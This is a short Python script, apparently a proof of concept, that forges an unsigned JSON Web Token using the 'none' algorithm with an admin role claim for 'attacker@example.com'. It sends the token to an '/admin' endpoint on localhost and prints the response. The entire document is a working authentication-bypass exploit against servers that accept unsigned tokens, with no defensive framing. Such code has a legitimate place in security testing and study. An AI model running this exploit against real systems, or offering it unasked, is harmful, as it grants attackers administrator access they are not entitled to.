import requests
import jwt

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "attacker@example.com", "role": "admin"}
unsigned_token = jwt.encode(payload, key=None, algorithm=None, headers=header)

print("Token forjado (alg none):", unsigned_token)

resp = requests.get("http://127.0.0.1:8000/admin", headers={"Authorization": f"Bearer {unsigned_token}"})
print("Status:", resp.status_code)
print("Body:", resp.text)